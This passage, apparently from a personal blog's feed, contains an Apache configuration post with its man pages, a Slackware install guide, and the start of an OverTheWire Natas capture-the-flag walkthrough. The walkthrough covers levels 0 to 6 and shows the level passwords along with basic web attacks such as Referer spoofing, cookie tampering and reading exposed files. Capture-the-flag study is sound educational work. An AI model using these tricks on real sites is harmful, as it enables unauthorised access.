<h1>Deny access to the entirety of your server&rsquo;s filesystem. You must</h1>

<h1>explicitly permit access to web content directories in other</h1>

<h1><Directory> blocks below.</h1>

<p>#
<Directory /></p>

<pre><code>AllowOverride none
Require all denied
</code></pre>

<p></Directory></p>

<p>#</p>

<h1>Note that from this point forward you must specifically allow</h1>

<h1>particular features to be enabled &ndash; so if something&rsquo;s not working as</h1>

<h1>you might expect, make sure that you have specifically enabled it</h1>

<h1>below.</h1>

<p>#</p>

<p>#</p>

<h1>DocumentRoot: The directory out of which you will serve your</h1>

<h1>documents. By default, all requests are taken from this directory, but</h1>

<h1>symbolic links and aliases may be used to point to other locations.</h1>

<p>#
DocumentRoot &ldquo;/var/www/html&rdquo;</p>

<p>#</p>

<h1>Relax access to content within /var/www.</h1>

<p>#
<Directory "/var/www"></p>

<pre><code>AllowOverride None
# Allow open access:
Require all granted
</code></pre>

<p></Directory></p>

<h1>Further relax access to the default document root:</h1>

<p><Directory "/var/www/html"></p>

<pre><code>#
# Possible values for the Options directive are "None", "All",
# or any combination of:
#   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews
#
# Note that "MultiViews" must be named *explicitly* --- "Options All"
# doesn't give it to you.
#
# The Options directive is both complicated and important.  Please see
# http://httpd.apache.org/docs/2.4/mod/core.html#options
# for more information.
#
Options Indexes FollowSymLinks

#
# AllowOverride controls what directives may be placed in .htaccess files.
# It can be "All", "None", or any combination of the keywords:
#   Options FileInfo AuthConfig Limit
#
AllowOverride None

#
# Controls who can get stuff from this server.
#
Require all granted
</code></pre>

<p></Directory></p>

<p>#</p>

<h1>DirectoryIndex: sets the file that Apache will serve if a directory</h1>

<h1>is requested.</h1>

<p>#
<IfModule dir_module></p>

<pre><code>DirectoryIndex index.html
</code></pre>

<p></IfModule></p>

<p>#</p>

<h1>The following lines prevent .htaccess and .htpasswd files from being</h1>

<h1>viewed by Web clients.</h1>

<p>#
<Files ".ht*"></p>

<pre><code>Require all denied
</code></pre>

<p></Files></p>

<p>#</p>

<h1>ErrorLog: The location of the error log file.</h1>

<h1>If you do not specify an ErrorLog directive within a <VirtualHost></h1>

<h1>container, error messages relating to that virtual host will be</h1>

<h1>logged here.  If you <em>do</em> define an error logfile for a <VirtualHost></h1>

<h1>container, that host&rsquo;s errors will be logged there and not here.</h1>

<p>#
ErrorLog &ldquo;logs/error_log&rdquo;</p>

<p>#</p>

<h1>LogLevel: Control the number of messages logged to the error_log.</h1>

<h1>Possible values include: debug, info, notice, warn, error, crit,</h1>

<h1>alert, emerg.</h1>

<p>#
LogLevel warn</p>

<p><IfModule log_config_module></p>

<pre><code>#
# The following directives define some format nicknames for use with
# a CustomLog directive (see below).
#
LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" combined
LogFormat "%h %l %u %t \"%r\" %&gt;s %b" common

&lt;IfModule logio_module&gt;
  # You need to enable mod_logio.c to use %I and %O
  LogFormat "%h %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\" %I %O" combinedio
&lt;/IfModule&gt;

#
# The location and format of the access logfile (Common Logfile Format).
# If you do not define any access logfiles within a &lt;VirtualHost&gt;
# container, they will be logged here.  Contrariwise, if you *do*
# define per-&lt;VirtualHost&gt; access logfiles, transactions will be
# logged therein and *not* in this file.
#
#CustomLog "logs/access_log" common

#
# If you prefer a logfile with access, agent, and referer information
# (Combined Logfile Format) you can use the following directive.
#
CustomLog "logs/access_log" combined
</code></pre>

<p></IfModule></p>

<p><IfModule alias_module></p>

<pre><code>#
# Redirect: Allows you to tell clients about documents that used to 
# exist in your server's namespace, but do not anymore. The client 
# will make a new request for the document at its new location.
# Example:
# Redirect permanent /foo http://www.example.com/bar

#
# Alias: Maps web paths into filesystem paths and is used to
# access content that does not live under the DocumentRoot.
# Example:
# Alias /webpath /full/filesystem/path
#
# If you include a trailing / on /webpath then the server will
# require it to be present in the URL.  You will also likely
# need to provide a &lt;Directory&gt; section to allow access to
# the filesystem path.

#
# ScriptAlias: This controls which directories contain server scripts. 
# ScriptAliases are essentially the same as Aliases, except that
# documents in the target directory are treated as applications and
# run by the server when requested rather than as documents sent to the
# client.  The same rules about trailing "/" apply to ScriptAlias
# directives as to Alias.
#
ScriptAlias /cgi-bin/ "/var/www/cgi-bin/"
</code></pre>

<p></IfModule></p>

<p>#</p>

<h1>&ldquo;/var/www/cgi-bin&rdquo; should be changed to whatever your ScriptAliased</h1>

<h1>CGI directory exists, if you have that configured.</h1>

<p>#
<Directory "/var/www/cgi-bin"></p>

<pre><code>AllowOverride None
Options None
Require all granted
</code></pre>

<p></Directory></p>

<p><IfModule mime_module></p>

<pre><code>#
# TypesConfig points to the file containing the list of mappings from
# filename extension to MIME-type.
#
TypesConfig /etc/mime.types

#
# AddType allows you to add to or override the MIME configuration
# file specified in TypesConfig for specific file types.
#
#AddType application/x-gzip .tgz
#
# AddEncoding allows you to have certain browsers uncompress
# information on the fly. Note: Not all browsers support this.
#
#AddEncoding x-compress .Z
#AddEncoding x-gzip .gz .tgz
#
# If the AddEncoding directives above are commented-out, then you
# probably should define those extensions to indicate media types:
#
AddType application/x-compress .Z
AddType application/x-gzip .gz .tgz

#
# AddHandler allows you to map certain file extensions to "handlers":
# actions unrelated to filetype. These can be either built into the server
# or added with the Action directive (see below)
#
# To use CGI scripts outside of ScriptAliased directories:
# (You will also need to add "ExecCGI" to the "Options" directive.)
#
#AddHandler cgi-script .cgi

# For type maps (negotiated resources):
#AddHandler type-map var

#
# Filters allow you to process content before it is sent to the client.
#
# To parse .shtml files for server-side includes (SSI):
# (You will also need to add "Includes" to the "Options" directive.)
#
AddType text/html .shtml
AddOutputFilter INCLUDES .shtml
</code></pre>

<p></IfModule></p>

<p>#</p>

<h1>Specify a default charset for all content served; this enables</h1>

<h1>interpretation of all content as UTF-8 by default.  To use the</h1>

<h1>default browser choice (ISO-8859-1), or to allow the META tags</h1>

<h1>in HTML content to override this choice, comment out this</h1>

<h1>directive:</h1>

<p>#
AddDefaultCharset UTF-8</p>

<p><IfModule mime_magic_module></p>

<pre><code>#
# The mod_mime_magic module allows the server to use various hints from the
# contents of the file itself to determine its type.  The MIMEMagicFile
# directive tells the module where the hint definitions are located.
#
MIMEMagicFile conf/magic
</code></pre>

<p></IfModule></p>

<p>#</p>

<h1>Customizable error responses come in three flavors:</h1>

<h1>1) plain text 2) local redirects 3) external redirects</h1>

<p>#</p>

<h1>Some examples:</h1>

<h1>ErrorDocument 500 &ldquo;The server made a boo boo.&rdquo;</h1>

<h1>ErrorDocument 404 /missing.html</h1>

<h1>ErrorDocument 404 &ldquo;/cgi-bin/missing_handler.pl&rdquo;</h1>

<h1>ErrorDocument 402 <a href="http://www.example.com/subscription_info.html">http://www.example.com/subscription_info.html</a></h1>

<p>#</p>

<p>#</p>

<h1>EnableMMAP and EnableSendfile: On systems that support it,</h1>

<h1>memory-mapping or the sendfile syscall may be used to deliver</h1>

<h1>files.  This usually improves server performance, but must</h1>

<h1>be turned off when serving from networked-mounted</h1>

<h1>filesystems or if support for these functions is otherwise</h1>

<h1>broken on your system.</h1>

<h1>Defaults if commented: EnableMMAP On, EnableSendfile Off</h1>

<p>#</p>

<h1>EnableMMAP off</h1>

<p>EnableSendfile on</p>

<h1>Supplemental configuration</h1>

<p>#</p>

<h1>Load config files in the &ldquo;/etc/httpd/conf.d&rdquo; directory, if any.</h1>

<p>IncludeOptional conf.d/*.conf
```</p>

<p><strong>apachectl utility</strong></p>

<p>``` plain
APACHECTL(8)                 apachectl                APACHECTL(8)</p>

<p>NAME</p>

<pre><code>   apachectl - Apache HTTP Server Control Interface
</code></pre>

<p>SYNOPSIS</p>

<pre><code>   When  acting  in  pass-through  mode,  apachectl can take all the arguments
   available for the httpd binary.


   apachectl [ httpd-argument ]


   When acting in SysV init mode, apachectl takes simple,  one-word  commands,
   defined below.


   apachectl command
</code></pre>

<p>SUMMARY</p>

<pre><code>   apachectl  is  a front end to the Apache HyperText Transfer Protocol (HTTP)
   server. It is designed to help the administrator control the functioning of
   the Apache httpd daemon.


   The  apachectl script can operate in two modes. First, it can act as a sim‐
   ple front-end to the httpd command that simply sets any necessary  environ‐
   ment  variables  and  then  invokes httpd, passing through any command line
   arguments. Second, apachectl can act as a SysV init script,  taking  simple
   one-word arguments like start, restart, and stop, and translating them into
   appropriate signals to httpd.


   If your Apache installation uses non-standard paths, you will need to  edit
   the  apachectl script to set the appropriate paths to the httpd binary. You
   can also specify any necessary httpd command line arguments. See  the  com‐
   ments in the script for details.


   The  apachectl script returns a 0 exit value on success, and &gt;0 if an error
   occurs. For more details, view the comments in the script.
</code></pre>

<p>OPTIONS</p>

<pre><code>   Only the SysV init-style options are  defined  here.  Other  arguments  are
   defined on the httpd manual page.



   start  Start  the Apache httpd daemon. Gives an error if it is already run‐
      ning. This is equivalent to apachectl -k start.

   stop   Stops the Apache httpd daemon. This is equivalent  to  apachectl  -k
      stop.

   restart
      Restarts  the  Apache httpd daemon. If the daemon is not running, it
      is started. This  command  automatically  checks  the  configuration
      files  as  in  configtest before initiating the restart to make sure
      the daemon doesn't die. This is equivalent to apachectl -k restart.

   fullstatus
      Displays a full status report from mod_status. For this to work, you
      need  to  have  mod_status  enabled  on your server and a text-based
      browser such as lynx available on  your  system.  The  URL  used  to
      access  the  status report can be set by editing the STATUSURL vari‐
      able in the script.

   status Displays a brief status report using systemd.

   graceful
      Gracefully restarts the Apache httpd daemon. If the  daemon  is  not
      running,  it  is  not started. This differs from a normal restart in
      that currently open connections are not aborted. A  side  effect  is
      that  old  log files will not be closed immediately. This means that
      if used in a log rotation script, a substantial delay may be  neces‐
      sary  to  ensure that the old log files are closed before processing
      them. This command automatically checks the configuration  files  as
      in  configtest  before  initiating  the  restart to make sure Apache
      doesn't die. This is equivalent to apachectl -k graceful.

   graceful-stop
      Gracefully stops the Apache httpd daemon. This differs from a normal
      stop  in  that  currently  open  connections are not aborted. A side
      effect is that old log files will not be closed immediately. This is
      equivalent to apachectl -k graceful-stop.

   configtest
      Run  a  configuration  file syntax test. It parses the configuration
      files and either reports Syntax Ok or detailed information about the
      particular syntax error. This is equivalent to apachectl -t.


   The  following  option  was  available  in  earlier  versions  but has been
   removed.



   startssl
      To start httpd with SSL support, you should edit your  configuration
      file  to  include  the  relevant  directives and then use the normal
      apachectl start.
</code></pre>

<p>Apache HTTP Server          2005-08-26                APACHECTL(8)
```</p>

<p><strong>httpd reference</strong></p>

<p>``` plain
HTTPD(8)                   httpd                  HTTPD(8)</p>

<p>NAME</p>

<pre><code>   httpd - Apache Hypertext Transfer Protocol Server
</code></pre>

<p>SYNOPSIS</p>

<pre><code>   httpd  [  -d serverroot ] [ -f config ] [ -C directive ] [ -c directive ] [
   -D parameter ] [  -e  level  ]  [  -E  file  ]  [  -k  start|restart|grace‐
   ful|stop|graceful-stop  ] [ -R directory ] [ -h ] [ -l ] [ -L ] [ -S ] [ -t
   ] [ -v ] [ -V ] [ -X ] [ -M ] [ -T ]


   On Windows systems, the following additional arguments are available:


   httpd [ -k install|config|uninstall ] [ -n name ] [ -w ]
</code></pre>

<p>SUMMARY</p>

<pre><code>   httpd is the Apache HyperText Transfer Protocol (HTTP) server  program.  It
   is  designed  to be run as a standalone daemon process. When used like this
   it will create a pool of child processes or threads to handle requests.


   In general, httpd should not be invoked  directly,  but  rather  should  be
   invoked  via apachectl on Unix-based systems or as a service on Windows NT,
   2000 and XP and as a console application on Windows 9x and ME.
</code></pre>

<p>OPTIONS</p>

<pre><code>   -d serverroot
      Set the initial value for the ServerRoot  directive  to  serverroot.
      This can be overridden by the ServerRoot directive in the configura‐
      tion file. The default is /etc/httpd.

   -f config
      Uses the directives in the file config on startup.  If  config  does
      not  begin  with  a /, then it is taken to be a path relative to the
      ServerRoot. The default is conf/httpd.conf.

   -k start|restart|graceful|stop|graceful-stop
      Signals httpd to start, restart, or stop. See Stopping Apache  httpd
      for more information.

   -C directive
      Process the configuration directive before reading config files.

   -c directive
      Process the configuration directive after reading config files.

   -D parameter
      Sets  a  configuration  parameter  which can be used with &lt;IfDefine&gt;
      sections in the configuration files to conditionally skip or process
      commands at server startup and restart. Also can be used to set cer‐
      tain less-common startup parameters including  -DNO_DETACH  (prevent
      the  parent  from forking) and -DFOREGROUND (prevent the parent from
      calling setsid() et al).

   -e level
      Sets the LogLevel to level during server startup. This is useful for
      temporarily  increasing  the verbosity of the error messages to find
      problems during startup.

   -E file
      Send error messages during server startup to file.

   -h     Output a short summary of available command line options.

   -l     Output a list of modules compiled into the  server.  This  will  not
      list dynamically loaded modules included using the LoadModule direc‐
      tive.

   -L     Output a list of directives provided  by  static  modules,  together
      with  expected  arguments  and  places where the directive is valid.
      Directives provided by shared modules are not listed.

   -M     Dump a list of loaded Static and Shared Modules.

   -S     Show the settings as parsed from the  config  file  (currently  only
      shows the virtualhost settings).

   -T (Available in 2.3.8 and later)
      Skip document root check at startup/restart.

   -t     Run  syntax  tests for configuration files only. The program immedi‐
      ately exits after these syntax parsing tests with  either  a  return
      code  of 0 (Syntax OK) or return code not equal to 0 (Syntax Error).
      If -D DUMP_VHOSTS is also set, details of the virtual host  configu‐
      ration  will be printed. If -D DUMP_MODULES  is set, all loaded mod‐
      ules will be printed.

   -v     Print the version of httpd, and then exit.

   -V     Print the version and build parameters of httpd, and then exit.

   -X     Run httpd in debug mode. Only one worker will  be  started  and  the
      server will not detach from the console.


   The following arguments are available only on the Windows platform:



   -k install|config|uninstall
      Install Apache httpd as a Windows NT service; change startup options
      for the Apache httpd service; and uninstall the  Apache  httpd  ser‐
      vice.

   -n name
      The name of the Apache httpd service to signal.

   -w     Keep  the console window open on error so that the error message can
      be read.
</code></pre>

<p>Apache HTTP Server          2012-02-10                HTTPD(8)
```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Slackware install guide]]></title>
    <link href="http://chousensha.github.io/blog/2016/04/28/slackware-install-guide/"/>
    <updated>2016-04-28T13:23:59-04:00</updated>
    <id>http://chousensha.github.io/blog/2016/04/28/slackware-install-guide</id>
    <content type="html"><![CDATA[<p>Ever since I got into Linux and wanting to learn more and get better at it, I always held an interest towards Slackware. Being one of the oldest distributions around, with a hardcore community and an old-school reputation, it always came in the top answers when it comes to learning Linux without fancy hand holding and the like (along with Arch). But I always liked Slackware, its name is awesome, and well, slackwarez for a slacker! So I&rsquo;ve finally set up some time to install it in a VM, and will get to work on it to deepen my Linux knowledge.</p>

<p>So in this post I will list the steps I went through to install Slackware 14.1 in VMware.</p>

<!-- more -->


<p>The cool thing about this installation was that I had to do some things manually without a GUI where all you do is press next. After selecting your installation media, which was the DVD ISO for me, power up the machine and you will get some command line action!</p>

<p>The first screen is for selecting which kernel to boot to</p>

<p><img class="center" src="/images/sysadmin/slackware/bootkernel.png" title="&lsquo;boot to kernel&rsquo; &lsquo;kernel booting&rsquo;" ></p>

<p>Select keyboard map</p>

<p><img class="center" src="/images/sysadmin/slackware/keyboard.png" title="&lsquo;keyboard map&rsquo; &lsquo;select key map&rsquo;" ></p>

<p>Log in as root</p>

<p><img class="center" src="/images/sysadmin/slackware/root.png" title="&lsquo;root login&rsquo; &lsquo;root login&rsquo;" ></p>

<h3>Partitioning</h3>

<p>You have to set up partitions before beginning the installation process</p>

<p><img class="center" src="/images/sysadmin/slackware/partition.png" title="&lsquo;partition&rsquo; &lsquo;partitioning&rsquo;" ></p>

<p>I will use cfdisk for this. As you can see, my disk is /dev/sda and is yet yet unpartitioned, so just a big lump of free space.</p>

<blockquote><p>cfdisk &ndash; display or manipulate a disk partition table</p></blockquote>

<p><img class="center" src="/images/sysadmin/slackware/cfdisk.png" title="&lsquo;cfdisk&rsquo; &lsquo;cfdisk&rsquo;" ></p>

<p>I will make 3 partitions, for swap, root and home. Select [New] to create a new partition. The MBR partitioning scheme supports up to 4 primary partitions, and if you need more than that you can make one of them an extended partition and create  logical partitions inside it. Choose [Primary] to continue</p>

<p><img class="center" src="/images/sysadmin/slackware/primary.png" title="&lsquo;primary partition&rsquo; &lsquo;primary partition&rsquo;" ></p>

<p>Since this will be the swap partition, I will make it a size of 512 MB.</p>

<p><img class="center" src="/images/sysadmin/slackware/size.png" title="&lsquo;partition size&rsquo; &lsquo;swap size&rsquo;" ></p>

<p>Next I selected to place it at the beginning of the drive, for simplicity. I&rsquo;ve also read that doing so might make it faster.</p>

<p><img class="center" src="/images/sysadmin/slackware/beginning.png" title="&lsquo;partition beginning&rsquo; &lsquo;beginning partition&rsquo;" ></p>

<p>Note how the first partition labeled sda1 was created. Next you have to choose the partition&rsquo;s type</p>

<p><img class="center" src="/images/sysadmin/slackware/type.png" title="&lsquo;partition type&rsquo; &lsquo;partition type&rsquo;" ></p>

<p>See how many different file systems can be created. Choose 82 for swap.</p>

<p><img class="center" src="/images/sysadmin/slackware/swap.png" title="&lsquo;type swap&rsquo; &lsquo;swap partition&rsquo;" ></p>

<p>Next make the root and home partitions, as described above. Only difference will be that you need to make the root partition bootable</p>

<p><img class="center" src="/images/sysadmin/slackware/bootable.png" title="&lsquo;bootable partition&rsquo; &lsquo;root bootable&rsquo;" ></p>

<p>Now write the changes to disk. You will be asked to confirm that you want to write the data</p>

<p><img class="center" src="/images/sysadmin/slackware/write.png" title="&lsquo;write partitions&rsquo; &lsquo;write data&rsquo;" ></p>

<p>After it&rsquo;s done you will see a message at the bottom: &ldquo;Wrote partition table to disk&rdquo;. You can quit cfdisk now</p>

<h3>Setup</h3>

<p>Type setup to begin the installation setup process</p>

<p><img class="center" src="/images/sysadmin/slackware/slacksetup.png" title="&lsquo;slackware setup&rsquo; &lsquo;install setup&rsquo;" ></p>

<p>Choose ADDSWAP to format the swap partition that was created earlier. It will be automatically detected by the setup wizard</p>

<p><img class="center" src="/images/sysadmin/slackware/swapsetup.png" title="&lsquo;add swap&rsquo; &lsquo;swap setup&rsquo;" ></p>

<p>You can choose to check for bad blocks if you want, but I skipped it</p>

<p><img class="center" src="/images/sysadmin/slackware/badblocks.png" title="&lsquo;check bad blocks&rsquo; &lsquo;bad blocks&rsquo;" ></p>

<p>You will get a message when the swap space is configured</p>

<p><img class="center" src="/images/sysadmin/slackware/swapdone.png" title="&lsquo;swap conf&rsquo; &lsquo;swap conf&rsquo;" ></p>

<p>Next you have to choose the root partition, which in my case is sda2</p>

<p><img class="center" src="/images/sysadmin/slackware/sda2root.png" title="&lsquo;root partition&rsquo; &lsquo;root sda2&rsquo;" ></p>

<p>I selected the quick format option</p>

<p><img class="center" src="/images/sysadmin/slackware/formatroot.png" title="&lsquo;root format&rsquo; &lsquo;quick format&rsquo;" ></p>

<p>For the filesystem I chose ext4</p>

<p><img class="center" src="/images/sysadmin/slackware/ext4.png" title="&lsquo;ext4&rsquo; &lsquo;ext4&rsquo;" ></p>

<p>The last partition is the home one</p>

<p><img class="center" src="/images/sysadmin/slackware/sda3home.png" title="&lsquo;sda3 home&rsquo; &lsquo;home&rsquo;" ></p>

<p>After formatting and choosing its filesystem, you have to specify where you want it mounted. Type /home</p>

<p><img class="center" src="/images/sysadmin/slackware/home.png" title="&lsquo;mount home&rsquo; &lsquo;home&rsquo;" ></p>

<p>The setup of the partitions is now complete</p>

<p><img class="center" src="/images/sysadmin/slackware/partitionsdone.png" title="&lsquo;partitions complete&rsquo; &lsquo;finished partitioning&rsquo;" ></p>

<p>Next you have to choose the source media for the installation. In my case, it is the DVD</p>

<p><img class="center" src="/images/sysadmin/slackware/sourcemedia.png" title="&lsquo;source media&rsquo; &lsquo;source dvd&rsquo;" ></p>

<p>Let the wizard auto scan for the DVD</p>

<p><img class="center" src="/images/sysadmin/slackware/autoscan.png" title="&lsquo;autoscan&rsquo; &lsquo;dvd scan&rsquo;" ></p>

<p>Select the general packages that you want, I kept all except for the KDE ones, since I will be using XFCE for my GUI</p>

<p><img class="center" src="/images/sysadmin/slackware/packages.png" title="&lsquo;package selection&rsquo; &lsquo;install packages&rsquo;" ></p>

<p>I chose the full option for simplicity</p>

<p><img class="center" src="/images/sysadmin/slackware/full.png" title="&lsquo;full install&rsquo; &lsquo;full&rsquo;" ></p>

<p>After the installation process, you can create a boot stick if you want, but I skipped it</p>

<p><img class="center" src="/images/sysadmin/slackware/bootdisk.png" title="&lsquo;boot stick&rsquo; &lsquo;boot disk&rsquo;" ></p>

<p>The bootloader used by Slackware is LILO. I selected the simple install and the standard console</p>

<p><img class="center" src="/images/sysadmin/slackware/lilo.png" title="&lsquo;lilo&rsquo; &lsquo;lilo&rsquo;" ></p>

<p><img class="center" src="/images/sysadmin/slackware/lilosplash.png" title="&lsquo;lilo splash screen&rsquo; &lsquo;lilo console&rsquo;" ></p>

<p>Skip the extra parameters unless you know what you&rsquo;re doing</p>

<p><img class="center" src="/images/sysadmin/slackware/kernelparams.png" title="&lsquo;lilo extra parameters&rsquo; &lsquo;lilo parameters&rsquo;" ></p>

<p>You will next be prompted where to install they bootloader. I chose the MBR, since this is a VM dedicated to Slackware. But if this was on a dual booting system with Windows, you would want to install it on root</p>

<p><img class="center" src="/images/sysadmin/slackware/lilombr.png" title="&lsquo;lilo mbr&rsquo; &lsquo;lilo install&rsquo;" ></p>

<p>Choose your mouse type</p>

<p><img class="center" src="/images/sysadmin/slackware/mouse.png" title="&lsquo;mouse type&rsquo; &lsquo;mouse&rsquo;" ></p>

<p>The General Purpose Mouse software provides support for mouse devices in Linux virtual consoles.</p>

<p><img class="center" src="/images/sysadmin/slackware/gpm.png" title="&lsquo;general purpose mouse&rsquo; &lsquo;gpm&rsquo;" ></p>

<p>Next is the network configuration</p>

<p><img class="center" src="/images/sysadmin/slackware/net.png" title="&lsquo;network&rsquo; &lsquo;net config&rsquo;" ></p>

<p>Enter your hostname and domain</p>

<p><img class="center" src="/images/sysadmin/slackware/hostname.png" title="&lsquo;hostname&rsquo; &lsquo;host&rsquo;" ></p>

<p><img class="center" src="/images/sysadmin/slackware/domain.png" title="&lsquo;domain name&rsquo; &lsquo;domain&rsquo;" ></p>

<p>For simplicity, I chose the Network Manager configuration</p>

<p><img class="center" src="/images/sysadmin/slackware/netconf.png" title="&lsquo;network configuration&rsquo; &lsquo;network config&rsquo;" ></p>

<p>Confirm your choices before continuing</p>

<p><img class="center" src="/images/sysadmin/slackware/netdone.png" title="&lsquo;network setup&rsquo; &lsquo;net setup&rsquo;" ></p>

<p>I went with the default startup services. Will add more on a need-to-use basis</p>

<p><img class="center" src="/images/sysadmin/slackware/startup.png" title="&lsquo;startup services&rsquo; &lsquo;startup&rsquo;" ></p>

<p>You can try custom screen fonts if you want</p>

<p><img class="center" src="/images/sysadmin/slackware/fonts.png" title="&lsquo;custom fonts&rsquo; &lsquo;screen fonts&rsquo;" ></p>

<p>Next is the hardware clock and timezone</p>

<p><img class="center" src="/images/sysadmin/slackware/hwclock.png" title="&lsquo;hardware clock&rsquo; &lsquo;clock&rsquo;" ></p>

<p><img class="center" src="/images/sysadmin/slackware/timezone.png" title="&lsquo;timezone&rsquo; &lsquo;timezone&rsquo;" ></p>

<p>For the GUI, I went with XFCE</p>

<p><img class="center" src="/images/sysadmin/slackware/gui.png" title="&lsquo;gui&rsquo; &lsquo;xfce&rsquo;" ></p>

<p>You will be asked to choose a root password next</p>

<p><img class="center" src="/images/sysadmin/slackware/pass.png" title="&lsquo;root password&rsquo; &lsquo;password&rsquo;" ></p>

<p>With this, the installation setup is complete</p>

<p><img class="center" src="/images/sysadmin/slackware/complete.png" title="&lsquo;setup complete&rsquo; &lsquo;setup finished&rsquo;" ></p>

<p>Exit the wizard and reboot your brand new Slackware machine. Hit Enter when you see the splash screen, or it will boot automatically in a couple of minutes</p>

<p><img class="center" src="/images/sysadmin/slackware/slacksplash.png" title="&lsquo;lilo splash screen&rsquo; &lsquo;lilo boot&rsquo;" ></p>

<h3>Booting into your system</h3>

<p>Slackware doesn&rsquo;t run the GUI automatically. You can change this by modifying the default runlevel</p>

<p><img class="center" src="/images/sysadmin/slackware/textlogin.png" title="&lsquo;text login&rsquo; &lsquo;no gui&rsquo;" ></p>

<p>I chose to manually start the GUI so I can read the random quotes that are given at login. You can load the GUI with the <strong>startx</strong> command</p>

<p><img class="center" src="/images/sysadmin/slackware/finished.png" title="&lsquo;slackware&rsquo; &lsquo;slackware install&rsquo;" ></p>

<p>All done! From here you can proceed to use your new distro, or customize it to your liking</p>

<p>``` plain
/ You will experience a strong urge to do \
\ good; but it will pass.                 /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Natas]]></title>
    <link href="http://chousensha.github.io/blog/2015/11/30/overthewire-natas/"/>
    <updated>2015-11-30T04:50:00-05:00</updated>
    <id>http://chousensha.github.io/blog/2015/11/30/overthewire-natas</id>
    <content type="html"><![CDATA[<p>Natas teaches the basics of serverside web-security.</p>

<p>Each level of natas consists of its own website located at **<a href="http://natasX.natas.labs.overthewire.org**,">http://natasX.natas.labs.overthewire.org**,</a> where X is the level number. There is no SSH login. To access a level, enter the username for that level (e.g. natas0 for level 0) and its password.</p>

<p>Each level has access to the password of the next level. Your job is to somehow obtain that next password and level up. All passwords are also stored in <strong>/etc/natas_webpass/</strong>. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.</p>

<p>Start here:</p>

<p>Username: natas0</p>

<p>Password: natas0</p>

<p>URL:      <a href="http://natas0.natas.labs.overthewire.org">http://natas0.natas.labs.overthewire.org</a></p>

<!-- more -->


<h3>Level 0</h3>

<p><img class="center" src="/images/overthewire/natas/natas0.png" title="&lsquo;natas0&rsquo; &lsquo;natas 0&rsquo;" ></p>

<p>Look in the source for the following comment:</p>

<p>``` html</p>

<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->


<p>```</p>

<h3>Level 1</h3>

<p><img class="center" src="/images/overthewire/natas/natas1.png" title="&lsquo;natas1&rsquo; &lsquo;natas 1&rsquo;" ></p>

<p>You can still view the page source from the URL:</p>

<p><code>plain
view-source:http://natas1.natas.labs.overthewire.org/
</code></p>

<p>Again, the password is in a comment:</p>

<p>``` html</p>

<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->


<p>```</p>

<h3>Level 2</h3>

<p><img class="center" src="/images/overthewire/natas/natas2.png" title="&lsquo;natas2&rsquo; &lsquo;natas 2&rsquo;" ></p>

<p>In the source you will see a directory path that you can navigate to:</p>

<p><code>html
&lt;img src="files/pixel.png"&gt;
</code>
Go to <a href="http://natas2.natas.labs.overthewire.org/files/">http://natas2.natas.labs.overthewire.org/files/</a> and you will see a directory listing. Chech the users.txt file:</p>

<p>``` plain</p>

<h1>username:password</h1>

<p>alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```</p>

<h3>Level 3</h3>

<p><img class="center" src="/images/overthewire/natas/natas2.png" title="&lsquo;natas3&rsquo; &lsquo;natas 3&rsquo;" ></p>

<p>There is a comment in the source again:</p>

<p>``` html</p>

<!-- No more information leaks!! Not even Google will find it this time... -->


<p>```</p>

<p>Well, since they mentioned Google, let&rsquo;s look for a robots.txt file..If you go to <a href="http://natas3.natas.labs.overthewire.org/robots.txt">http://natas3.natas.labs.overthewire.org/robots.txt</a> , you will see the following line: <code>Disallow: /s3cr3t/</code>. Navigate to <a href="http://natas3.natas.labs.overthewire.org/s3cr3t/">http://natas3.natas.labs.overthewire.org/s3cr3t/</a> and there is another users.txt file: <code>natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ</code></p>

<h3>Level 4</h3>

<p><img class="center" src="/images/overthewire/natas/natas4.png" title="&lsquo;natas4&rsquo; &lsquo;natas 4&rsquo;" ></p>

<p>If our access is permitted based on the Referer header, all we have to do is change it. I used Live HTTP Headers for the task. Changed the Referer, refreshed the page and: <code>Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq</code></p>

<h3>Level 5</h3>

<p><img class="center" src="/images/overthewire/natas/natas5.png" title="&lsquo;natas5&rsquo; &lsquo;natas 5&rsquo;" ></p>

<p>So how do they determine if I&rsquo;m logged in? A cookie maybe..I used Firebug to look at cookies, and indeed there is a loggedin cookie with the value of 0. Changed it to 1 and <code>Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</code></p>

<h3>Level 6</h3>

<p><img class="center" src="/images/overthewire/natas/natas6.png" title="&lsquo;natas6&rsquo; &lsquo;natas 6&rsquo;" ></p>

<p>This time we are also given the backend source code:</p>

<p>``` php
&lt;?</p>

<p>include &ldquo;includes/secret.inc&rdquo;;</p>

<pre><code>if(array_key_exists("submit", $_POST)) {
    if($secret == $_POST['secret']) {
    print "Access granted. The password for natas7 is &lt;censored&gt;";
} else {
    print "Wrong secret";
}
}
</code></pre>

<p>?>
```</p>

<p>That include directive stands out. If you go to <a href="http://natas6.natas.labs.overthewire.org/includes/secret.inc">http://natas6.natas.labs.overthewire.org/includes/secret.inc</a> you get a blank page. But the source is not so blank:</p>

<p><code>php
&lt;?
$secret = "FOEIUWGHFEEUHOFUOIU";
?&gt;
</code></p>

<p>Enter it in the form and <code>Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9</code></p>

<h3>Level 7</h3>

<p><img class="center" src="/images/overthewire/natas/natas7.png" title="&lsquo;natas7&rsquo; &lsquo;natas 7&rsquo;" ></p>

<p>Inside the source there&rsquo;s a comment:</p>

<p>``` html</p>

